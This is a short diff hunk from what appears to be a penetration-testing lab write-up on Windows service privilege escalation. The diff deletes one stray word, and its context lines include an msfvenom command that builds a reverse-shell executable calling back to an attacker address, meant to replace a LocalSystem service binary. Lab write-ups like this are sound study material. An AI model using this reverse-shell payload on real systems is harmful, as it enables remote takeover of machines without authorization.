@@ -107,7 +107,6 @@ SERVICE_NAME: domain1
         SERVICE_START_NAME : LocalSystem
 ```
 so we will put a reverse shell name domain1Service.exe and restart the computer to trigger the payload  
-payload
 ```console
 $ msfvenom -p windows/shell_reverse_tcp lhost=192.168.45.209 lport=139 -f exe > domain1Service.exe 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
